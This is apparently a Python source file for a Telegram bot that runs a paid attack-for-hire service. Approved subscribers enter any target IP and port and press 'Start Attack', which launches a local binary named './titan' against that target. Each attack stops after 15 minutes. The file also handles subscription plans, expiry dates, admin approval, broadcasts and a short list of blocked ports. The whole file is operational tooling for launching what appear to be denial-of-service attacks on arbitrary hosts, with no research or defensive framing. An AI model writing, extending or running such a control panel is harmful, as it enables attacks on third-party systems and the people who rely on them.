import time
import requests
import logging
from threading import Thread, Timer
import json
import os
import telebot
import subprocess
from datetime import datetime, timedelta

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN, threaded=False, skip_pending=True)

# File paths
USERS_FILE = 'users.txt'
ATTACK_FILE = "attack.txt"

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

def remove_expired_users():
    global users
    current_date = datetime.now().date()
    users = [user for user in users if datetime.fromisoformat(user['valid_until']).date() >= current_date]
    save_users(users)

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Save attack details to the file
def save_attack_data(user_id, target_ip, target_port):
    with open(ATTACK_FILE, "a") as f:
        attack_details = {
            "user_id": user_id,
            "target_ip": target_ip,
            "target_port": target_port,
            "timestamp": datetime.now().isoformat()
        }
        f.write(f"{json.dumps(attack_details)}\n")

# Initialize active attacks dictionary
active_attacks = {}

# Dictionary to store timers for each user's attack
attack_timers = {}

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    remove_expired_users()  # Remove expired users before checking
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED TO USE THIS ⚠*", parse_mode='Markdown')

# Run attack command synchronously
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./titan", target_ip, str(target_port), "1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(target_ip, target_port)] = process
    elif action == 2:
        process = active_attacks.pop((target_ip, target_port), None)
        if process:
            process.terminate()
            logging.info(f"Stopped attack on {target_ip}:{target_port}")

# Function to stop the attack due to timer expiry
def auto_stop_attack(user_id, target_ip, target_port, chat_id):
    if (target_ip, target_port) in active_attacks:
        bot.send_message(chat_id, f"Attack on {target_ip}:{target_port} automatically stopped after 15 minutes.", parse_mode='Markdown')
        run_attack_command_sync(target_ip, target_port, 2)
        del attack_timers[user_id]

# Buttons
btn_attack = telebot.types.KeyboardButton("Save Attack ⚡")
btn_start = telebot.types.KeyboardButton("Start Attack 🚀")
btn_stop = telebot.types.KeyboardButton("Stop Attack 🔴")

markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
markup.add(btn_attack, btn_start, btn_stop)

# Start and setup commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return

    username = message.from_user.username
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"Please choose an option below to continue.")
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return

        approved_users = [user for user in users if user['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

# Broadcast Command
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split(maxsplit=1)

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*YOU ARE NOT AUTHORIZED TO USE THIS ⚠.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /broadcast <message>*", parse_mode='Markdown')
        return

    broadcast_msg = cmd_parts[1]

    for user in users:
        if user['plan'] > 0:
            try:
                bot.send_message(user['user_id'], broadcast_msg, parse_mode='Markdown')
            except telebot.apihelper.ApiException as e:
                logging.error(f"Failed to send message to user {user['user_id']}: {e}")

    bot.send_message(chat_id, "*Broadcast message sent to all approved users.*", parse_mode='Markdown')

# Approve or disapprove users
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*YOU ARE NOT AUTHORIZED TO USE THIS ⚠*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_info = {"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0}

        users.append(user_info)
        save_users(users)

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users[:] = [user for user in users if user['user_id'] != target_user_id]
        save_users(users)

        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')

# Handle the IP and port input from the user
@bot.message_handler(func=lambda message: message.text == 'Save Attack ⚡')
def handle_attack_setup(message):
    chat_id = message.chat.id
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(chat_id)
        return

    msg = bot.send_message(chat_id, "Please enter the target IP and port in this format: `IP PORT`")
    bot.register_next_step_handler(msg, save_ip_port)

def save_ip_port(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        ip_port = message.text.split()

        if len(ip_port) != 2:
            bot.send_message(chat_id, "Invalid format. Please enter the IP and port in the format: `IP PORT`")
            return

        target_ip, target_port = ip_port

        # Save the IP and port to attack.txt
        save_attack_data(user_id, target_ip, target_port)

        bot.send_message(chat_id, f"Target IP and Port saved as: `{target_ip}:{target_port}`", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in saving IP and port: {e}")

@bot.message_handler(func=lambda message: message.text == 'Start Attack 🚀')
def handle_start_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        attack_details = get_last_saved_attack()  # Get the last saved attack from the file
        if attack_details and attack_details['user_id'] == user_id:
            target_ip = attack_details['target_ip']
            target_port = int(attack_details['target_port'])

            if target_port in blocked_ports:
                bot.send_message(chat_id, f"Port {target_port} is blocked and cannot be used for attacks.", parse_mode='Markdown')
            else:
                bot.send_message(chat_id, f"Starting attack on {target_ip}:{target_port}", parse_mode='Markdown')

                # Start the attack
                attack_thread = Thread(target=run_attack_command_sync, args=(target_ip, target_port, 1))
                attack_thread.start()

                # Set a timer to auto-stop the attack after 15 minutes (900 seconds)
                if user_id in attack_timers:
                    attack_timers[user_id].cancel()  # Cancel any previous timer
                attack_timers[user_id] = Timer(900, auto_stop_attack, args=[user_id, target_ip, target_port, chat_id])
                attack_timers[user_id].start()
        else:
            bot.send_message(chat_id, "Please set the target IP and Port first by using 'Save Attack ⚡'", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in starting attack: {e}")

@bot.message_handler(func=lambda message: message.text == 'Stop Attack 🔴')
def handle_stop_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        # Check if there are any active attacks
        if not active_attacks:
            bot.send_message(chat_id, "No active attack to stop. Please start an attack first.", parse_mode='Markdown')
            return

        attack_details = get_last_saved_attack()  # Get the last saved attack from the file
        if attack_details and attack_details['user_id'] == user_id:
            target_ip = attack_details['target_ip']
            target_port = int(attack_details['target_port'])

            bot.send_message(chat_id, f"Stopping attack on {target_ip}:{target_port}", parse_mode='Markdown')

            # Stop the attack
            attack_thread = Thread(target=run_attack_command_sync, args=(target_ip, target_port, 2))
            attack_thread.start()

            # Cancel the auto-stop timer if the user stops the attack manually
            if user_id in attack_timers:
                attack_timers[user_id].cancel()
                del attack_timers[user_id]
        else:
            bot.send_message(chat_id, "Please set the target IP and Port first by using 'Save Attack ⚡'", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in stopping attack: {e}")

def send_message_with_retry(chat_id, text, retries=3, delay=5):
    for i in range(retries):
        try:
            bot.send_message(chat_id, text, parse_mode='Markdown')
            break  # If successful, break out of the loop
        except requests.exceptions.RequestException as e:
            logging.error(f"RequestException occurred: {str(e)}")
            if i < retries - 1:  # If not the last attempt, wait and retry
                time.sleep(delay)
            else:
                bot.send_message(chat_id, "Failed to communicate with Telegram API after multiple attempts.")

# Function to get the last saved attack
def get_last_saved_attack():
    if os.path.exists(ATTACK_FILE):
        with open(ATTACK_FILE, "r") as f:
            lines = f.readlines()
            if lines:
                return json.loads(lines[-1])  # Return the last saved attack
    return None

# Function to run the bot continuously
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            logging.error(f"Bot polling failed: {str(e)}")
            time.sleep(15)  # Sleep before retrying to avoid rapid failures

# Main entry point
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    try:
        run_bot()
    except KeyboardInterrupt:
        logging.info("Bot stopped by user.")
